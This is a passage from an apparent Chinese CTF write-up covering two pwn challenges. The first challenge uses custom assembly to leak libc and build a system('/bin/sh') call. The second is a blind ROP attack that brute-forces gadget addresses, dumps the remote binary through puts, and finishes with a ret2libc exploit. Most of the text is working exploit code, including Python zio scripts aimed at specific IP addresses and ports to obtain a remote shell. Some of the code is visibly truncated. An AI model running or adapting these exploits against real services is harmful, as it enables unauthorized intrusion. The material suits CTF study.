    0x6c6c6568,0x726f776f,0x646c
    end
    lea r0,r0
    sub r1,r0,0x3054
    ;set read_got
    add r0,r1,0x3010
    ;leak info in r0:  r2 = [r0]
    mov r2,sp
    mov sp,r0
    pop r0
    mov sp,r2
    mov r2,r0
    ;libc_base addr
    sub r0,r2,0xd41c0
    push r0
    ;leak environ_got
    add r0,r0,0x001b1dbc
    ;show info
    ;mov r2,r0
    ;push r2
    ;call puts
    ;mov r0,r2
    ;leak environ_addr
    mov r2,sp
    mov sp,r0
    pop r0
    mov sp,r2
    mov r2,r0
    ;ret addr
    sub r2,r2,0xd0
    ;push r2
    add r2,r2,0xC
    #get libc_base
    pop r1
    ;set addr at r2
    mov sp,r2
    #binsh_addr
    add r0,r1,0x158e8b
    push r0
    #system_addr
    add r0,r1,0x0003a940
    push r0
    add r0,r1,0x0003a940
    push r0
    ;show info
    ;push r2
    ;call puts
    ;push r2
    ;call puts
    ;push r2
    ;call puts
    $
对上述asm文件去注释脚本：
    file_r = open("do_work.asm", 'r')
    info = file_r.readlines()
    file_r.close()
    file_w = open("do_work_real.asm", 'w')
    for line in info:
           if line.startswith(";"):
                  continue
           if line.startswith("#"):
                  continue
           if len(line.strip()) == 0:
                  continue
           file_w.write(line)
    file_w.close()
获取shell脚本：
    from zio import *
    target = "./pwn"
    target = ("115.28.78.54", 23333)
    def get_io(target):
           r_m = COLORED(RAW, "green")
           w_m = COLORED(RAW, "blue")
           io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
           return io
    def pwn(io):
           io.read_until(":")
           io.writeline("927e613a91620da8c5f10936faf70f4dgDR95OLX")
           io.read_until("!n")
           file_r = open("1.bin", "rb")
           data = file_r.read()
           file_r.close()
           sinal = "give me your code, end with a single line of '$'n"
           data = data.replace(sinal, "")
           #print data
           io.gdb_hint()
           #data = data.ljust(0x300, 'a')
           io.write(data)
           io.interact()
    io = get_io(target)
    pwn(io)
转换bin文件并执行脚本run.sh：
python compiler.py
./make_code  1.bin
python pwn.py
flag如下：
**出题人失踪了**
因为没有给bin，根据两个提示，感觉可能是一个栈溢出。
猜测没有开启pie，所以基地址为0x08048000或者0x400000。最开始尝试0x08048000,没有任何发现。
经过测试，当输入字符超过72字节时，程序不会回显No password, No game。
构造如下payload爆破，发现当i=0x711时，程序会正常打印No password, No
game，而i=0x70c时，程序会继续等待输入。所以可以推断0x40070c为call指令，调用漏洞函数，0x400711为函数返回地址。
        for i in range(0, 0x1000):
            payload = 'a'*72 + l64(0x0400000+i)
因为是64位程序，要想实现任意地址泄露，主要需要知道pop_rdi_ret和puts_plt的地址。
在64位ELF中，通常存在一个pop r15；ret，对应的字节码为41 5f c3。后两字节码5f c3对应的汇编为pop rdi;ret。
当一个地址满足如下3个payload都能正常打印NO password, No game的话，就可以得到一个pop rdi;ret的地址。
    Payload1 = 'a'*72 + l64(addr-1)+l64(0)+l64(0x400711) 
    Payload2 = 'a'*72 + l64(addr)+l64(0)+l64(0x400711) 
    Payload3 = 'a'*72 + l64(addr+1) +l64(0x400711)
最终得到的pop_rdi_ret地址为0x4007c3。
**构造**
Payload3 = 'a'*72 + l64(pop_rdi_ret) +l64(0x400000)+l64(addr)
如果程序打印前4个字节为x7fELF，则addr为puts_plt。
得到puts_plt的地址为0x400570
后面就是dump+exp了。Exp大致如下:
    from threading import Thread
    import time
    # from uploadflag import *
    from zio import *
    target = ('119.254.101.197', 10000)
    target = './test'
    target = ('115.28.78.54', 13455)
    def interact(io):
        def run_recv():
            while True:
                try:
                    output = io.read_until_timeout(timeout=1)
                    # print output
                except:
                    return
        t1 = Thread(target=run_recv)
        t1.start()
        while True:
            d = raw_input()
            if d != '':
    def exp4(target):
        puts_plt = 0x400570
        pop_rdi_ret = 0x4007c3
        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
                 print_write=COLORED(RAW, 'green'))
        io.read_until('token:')
        io.writeline('927e613a91620da8c5f10936faf70f4dgDR95OLX')
        base = 0x400000
        d = ''
        while True:
            print hex(len(d))
            io.read_until('?n')
            payload = 'a'*72 + l64(pop_rdi_ret) +l64(base+len(d)) + l64(puts_plt)
            io.writeline(payload)
            d += io.readline()[:-1] + 'x00'
            if len(d) > 0x9bc:
                break
        f = open('code.bin', 'wb')
        f.write(d)
        f.close()
        base = 0x600e10
        d = ''
        while True:
            print hex(len(d))
            io.read_until('?n')
            payload = 'a'*72 + l64(pop_rdi_ret) +l64(base+len(d)) + l64(puts_plt)
            io.writeline(payload)
            d += io.readline()[:-1] + 'x00'
            if len(d) > 0x248:
                break
        f = open('data.bin', 'wb')
        f.write(d)
        f.close()
        io.close()
    def exp5(target):
        puts_plt = 0x400570
        pop_rdi_ret = 0x4007c3
        read_got = 0x601028
        puts_got = 0x601018
        passcode = 'aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk'
        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
                 print_write=COLORED(RAW, 'green'))
        io.read_until('token:')
        io.writeline('927e613a91620da8c5f10936faf70f4dgDR95OLX')
        io.read_until('?n')
        main = 0x004006BD
        io.writeline('a'*72+l64(pop_rdi_ret)+l64(puts_got)+l64(puts_plt)+l64(main))
        base = l64(io.readline()[:-1].ljust(8, 'x00')) - 0x000000000006f690
        system = base + 0x0000000000045390
        binsh = base + 0x18c177
        io.read_until('?n')
        io.writeline('a'*72+l64(pop_rdi_ret)+l64(binsh)+l64(system)+l64(main))
    interact(io)
    exp5(target)